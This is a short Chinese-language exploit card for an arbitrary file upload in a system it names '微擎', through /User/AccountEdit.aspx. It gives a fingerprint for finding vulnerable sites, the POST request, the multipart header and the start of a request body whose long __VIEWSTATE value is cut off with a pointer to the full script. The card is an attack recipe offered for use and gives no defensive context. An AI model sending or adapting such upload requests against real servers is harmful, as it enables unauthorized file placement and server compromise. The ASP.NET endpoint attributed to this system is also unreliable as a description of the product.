# 微擎系统-任意文件上传-AccountEdit

- **系统**：微擎系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Widgets/WidgetCollection/"`
- **请求**：`POST /User/AccountEdit.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=---------------------------7864…`

**请求体 / payload**
```
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwUJNjcyMTYyMDMwD2QWAmYPZBYCAgcPZBYCAgEQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ8PFgIeBFRleHQFigI8TEkgY2xhc3M9VGFiSW4gaWQ9dGFiMSBzdHlsZT0nZGlzcGxheTonPjxBPuWfuuacrOS/oeaBrzwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjQgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9ND7pgInpobk8L0E+IDwvTEk+PExJIGNsYXNzPVRhYk91dCBpZD10YWI1ICBzdHlsZT0nZGlzcGxheTonPjxBICBocmVmPS9Vc2VyL0FjY291bnRFZGl0LmFzcHg/dGFiPTU+5a+G56CB6K6+572uPC9BPiA8L0xJPmRkZOX0i8mrn…（脚本共 1586 字，完整版见原文）
```
- **预期**：200　|　—